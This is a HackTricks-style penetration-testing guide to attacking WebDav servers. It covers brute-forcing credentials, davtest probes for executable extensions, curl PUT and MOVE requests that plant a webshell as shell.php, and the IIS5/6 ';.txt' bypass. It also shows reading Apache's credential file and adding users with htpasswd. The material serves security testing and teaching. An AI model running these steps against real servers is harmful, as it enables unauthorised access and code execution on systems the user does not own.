_body: "# WebDav\n\n{{#include ../../banners/hacktricks-training.md}}\n\nWhen dealing with a **HTTP Server with WebDav** enabled,\
  \ it's possible to **manipulate files** if you have the right **credentials**, usually verified through **HTTP Basic Authentication**.\
  \ Gaining control over such a server often involves the **upload and execution of a webshell**.\n\nAccess to the WebDav\
  \ server typically requires **valid credentials**, with [**WebDav bruteforce**](../../generic-hacking/brute-force.md#http-basic-auth)\
  \ being a common method to acquire them.\n\nTo overcome restrictions on file uploads, especially those preventing the execution\
  \ of server-side scripts, you might:\n\n- **Upload** files with **executable extensions** directly if not restricted.\n\
  - **Rename** uploaded non-executable files (like .txt) to an executable extension.\n- **Copy** uploaded non-executable files,\
  \ changing their extension to one that is executable.\n\n## DavTest\n\n**Davtest** try to **upload several files with different\
  \ extensions** and **check** if the extension is **executed**:\n\n```bash\ndavtest [-auth user:password] -move -sendbd auto\
  \ -url http://<IP> #Uplaod .txt files and try to move it to other extensions\ndavtest [-auth user:password] -sendbd auto\
  \ -url http://<IP> #Try to upload every extension\n```\n\nOutput sample:\n\n![](<../../images/image (851).png>)\n\nThis\
  \ doesn't mean that **.txt** and **.html extensions are being executed**. This mean that you can **access this files** through\
  \ the web.\n\n## Cadaver\n\nYou can use this tool to **connect to the WebDav** server and perform actions (like **upload**,\
  \ **move** or **delete**) **manually**.\n\n```\ncadaver <IP>\n```\n\n## PUT request\n\n```\ncurl -T 'shell.txt' 'http://$ip'\n\
  ```\n\n## MOVE request\n\n```bash\ncurl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'\n```\n\
  \n## IIS5/6 WebDav Vulnerability\n\nThis vulnerability is very interesting. The **WebDav** does **not allow** to **upload**\
  \ or **rename** files with the extension **.asp**. But you can **bypass** this **adding** at the end of the name **\";.txt\"\
  ** and the file will be **executed** as if it were a .asp file (you could also **use \".html\" instead of \".txt\"** but\
  \ **DON'T forget the \";\"**).\n\nThen you can **upload** your shell as a \".**txt\" file** and **copy/move it to a \".asp;.txt\"\
  ** file. An accessing that file through the web server, it will be **executed** (cadaver will said that the move action\
  \ didn't work, but it did).\n\n![](<../../images/image (1092).png>)\n\n## Post credentials\n\nIf the Webdav was using an\
  \ Apache server you should look at configured sites in Apache. Commonly:\\\n_**/etc/apache2/sites-enabled/000-default**_\n\
  \nInside it you could find something like:\n\n```\nServerAdmin webmaster@localhost\n        Alias /webdav /var/www/webdav\n\
  \        <Directory /var/www/webdav>\n                DAV On\n                AuthType Digest\n                AuthName\
  \ \"webdav\"\n                AuthUserFile /etc/apache2/users.password\n                Require valid-user\n```\n\nAs you\
  \ can see there is the files with the valid **credentials** for the **webdav** server:\n\n```\n/etc/apache2/users.password\n\
  ```\n\nInside this type of files you will find the **username** and a **hash** of the password. These are the credentials\
  \ the webdav server is using to authenticate users.\n\nYou can try to **crack** them, or to **add more** if for some reason\
  \ you wan to **access** the **webdav** server:\n\n```bash\nhtpasswd /etc/apache2/users.password <USERNAME> #You will be\
  \ prompted for the password\n```\n\nTo check if the new credentials are working you can do:\n\n```bash\nwget --user <USERNAME>\
  \ --ask-password http://domain/path/to/webdav/ -O - -q\n```\n\n## References\n\n- [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)\n\
